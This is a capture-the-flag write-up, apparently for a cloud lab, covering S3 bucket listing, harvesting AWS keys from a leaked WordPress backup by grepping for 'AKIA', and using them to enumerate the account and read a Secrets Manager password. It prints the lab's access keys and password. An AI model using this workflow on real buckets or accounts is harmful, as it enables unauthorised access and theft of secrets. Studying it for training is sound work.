# Elf Leaks


## Amazon S3 (Simple Storage Service)
- Hosted object storage service
- Buckets are key-value stores, with object being a full pathname ofr a file and the value being the contents of the file
- Buckets use a global namespace
- Sometimes data gets mixed up, and data that shouldn't be public gets made public
- Discovering bucket names
    - S3 links will be in the form
        - `http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext`
        - `http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext`
- Listing the contents of Buckets
    - `aws s3 ls s3://irs-form-990/ --no-sign-request`
        - --no-sign-request allows you to request data without being an AWS customer
- Downloading Objects
    - `aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request`
- Object permissions are different from bucket permissions
    - Bucket permissions allow you to list the objects in the bucket
    - Object permissions allow you to download the object

## AWS IAM
- All requests to AWS services must be signed, which require IAM access keys
- IAM access keys
    - Consist of an access key id and a secret access key
    - Access Key ID
        - Begin with letters 'AKIA' and are 20 characters long
        - Act as a username for the AWS API
    - Secret Access Key
        - 40 characters long
- When you find credentials to AWS, you can add them to your AWS profile in the CLI with `aws configure --profile PROFILENAME`
    - This adds entries to the .aws/config and .aws/credentials files
- Now you can execute a command using these credentials
    - `aws s3 ls --profile PROFILENAME`
    - **ProTip: Never store a set of access keys in the [default] profile. Doing so forces you always to specify a profile and never accidentally run a command against an account you don't intend to.**
- A few other common AWS reconnaissance techniques are:
    - Finding the Account ID belonging to an access key:
        - `aws sts get-access-key-info --access-key-id AKIAEXAMPLE`
    - Determining the Username the access key you're using belongs to
        - `aws sts get-caller-identity --profile PROFILENAME`
    - Listing all the EC2 instances running in an account
        - `aws ec2 describe-instances --output text --profile PROFILENAME`
    - Listing all the EC2 instances running in an account in a different region
        - `aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME`
- AWS ARNs
    - Generate a unique identifier for all resources in the AWS cloud
    - `arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>`

## Exersize
1. Inspect the code of the image to get images.bestfestivalcompany.com
2. Use `aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request` to get the files in the directory, then use `aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request` to download flag.txt. The message is `It's easy to get your elves data when you leave it so easy to find!`
```
root@ip-10-10-78-124:~# aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request
2021-11-13 15:06:51       6148 .DS_Store
2021-11-13 12:43:03     108420 0vF39p3.png
2021-11-27 11:55:21     705191 AWSConsole.png
2021-11-13 12:43:03       5652 aws-logo.png
2021-11-13 15:06:51         68 flag.txt
2021-11-13 15:06:51    2349068 flyer.png
2021-11-13 12:43:03      92531 presents.jpg
2021-11-13 12:43:03       4680 tree.png
2021-11-23 23:52:22   16556739 wp-backup.zip
```
3. All the other files are images, so wp-backup.zip looks interesting
4. Unzip the file using `unzip wp-backup.zip`. Then use grep to search all the files in the directory for the characters "AKIA" `grep -r AKIA .`. The access key id is `AKIAQI52OJVCPZXFYAOI`. We find that the wp-config.php file contains all the passwords/keys. We also find that the secret access key is `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` and the region is `us-east-1`
```
root@ip-10-10-78-124:~/wp_backup# grep -r AKIA .
./wp-config.php:define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
```
5. We try to find the account id with `aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI`, but we get an error message `Unable to locate credentials. You can configure credentials by running "aws configure".`. We run `aws configure`, enter the access key id, the secret access key, and the region, and leave the default output format blank. We try `aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI` again and get
```
root@ip-10-10-78-124:~/wp_backup# aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI

{
    "Account": "019181489476"
}
```
6. Add the credentials to a new profile called "testing" with `aws configure --profile testing` and following the same process in the last step. Then use `aws sts get-caller-identity --profile testing` to get this output. Use the ARN format to see that the username is `ElfMcHR@bfc.com`
```
root@ip-10-10-78-124:~/wp_backup# aws sts get-caller-identity --profile testing
{
    "UserId": "AIDAQI52OJVCFHT3E73BO",
    "Account": "019181489476",
    "Arn": "arn:aws:iam::019181489476:user/ElfMcHR@bfc.com"
}
```
7. Use `aws ec2 describe-instances --output text --profile testing` to find that the name of the instance is `HR-Portal`
```
root@ip-10-10-78-124:~/wp_backup# aws ec2 describe-instances --output text --profile testing
RESERVATIONS	019181489476	043234062703	r-0e89ba65b28a7c699
INSTANCES	0	x86_64	HR-Po-Insta-1NAKAMW2PPVMT	False	True	xen	ami-0c2b8ca1dad447f8a	i-0c56041ac61cf5a95	t3a.micro	hr-key	2021-11-13T12:36:58.000Zip-172-31-68-81.ec2.internal	172.31.68.81		/dev/xvda	ebs	True	User initiated (2021-11-13 12:42:39 GMT)	subnet-00b1107c0c18c0722	hvm	vpc-0235b5a9591606b73
BLOCKDEVICEMAPPINGS	/dev/xvda
EBS	2021-11-13T12:36:59.000Z	True	attached	vol-0ac79339aac8b249d
CAPACITYRESERVATIONSPECIFICATION	open
CPUOPTIONS	1	2
HIBERNATIONOPTIONS	False
METADATAOPTIONS	enabled	1	optional	applied
MONITORING	disabled
NETWORKINTERFACES		interface	16:35:78:d8:60:d1	eni-027945da0ddb79e59	019181489476	ip-172-31-68-81.ec2.internal	172.31.68.81	True	in-use	subnet-00b1107c0c18c0722	vpc-0235b5a9591606b73
ATTACHMENT	2021-11-13T12:36:58.000Z	eni-attach-0d91e2137f6014220	True	0	attached
GROUPS	sg-0c6e7cd87c1c8d035	default
PRIVATEIPADDRESSES	True	ip-172-31-68-81.ec2.internal	172.31.68.81
PLACEMENT	us-east-1f		default
SECURITYGROUPS	sg-0c6e7cd87c1c8d035	default
STATE	80	stopped
STATEREASON	Client.UserInitiatedShutdown	Client.UserInitiatedShutdown: User initiated shutdown
TAGS	aws:cloudformation:stack-id	arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7
TAGS	aws:cloudformation:logical-id	Instance
TAGS	created_by	Elf McHR
TAGS	aws:cloudformation:stack-name	HR-Portal
TAGS	Name	HR-Portal
```

8. Use `aws secretsmanager help` to see a list of commands and [secretsmanager docs](https://docs.aws.amazon.com/secretsmanager/latest/userguide/tutorials_basic.html) for help. Use `aws secretsmanager list-secrets` to see all the secrets. Use `aws secretsmanager get-secret-value --secret-id HR-Password` and we see that the "SecretString" key has the value "The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.". In this [AWS page](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html#concepts-available-regions) we see that the regious you have access to depends on your account. We want to use the region closest to the north, so we can try eu-north-1. Now try `aws secretsmanager get-secret-value --secret-id HR-Password --region eu-north-1` and we get `Winter2021!`
```
root@ip-10-10-78-124:~/wp_backup# aws secretsmanager get-secret-value --secret-id HR-Password --region eu-north-1
{
    "ARN": "arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK",
    "Name": "HR-Password",
    "VersionId": "f806c3cd-ea20-4a1a-948f-80927f3ad366",
    "SecretString": "Winter2021!",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1636809979.996
}
```
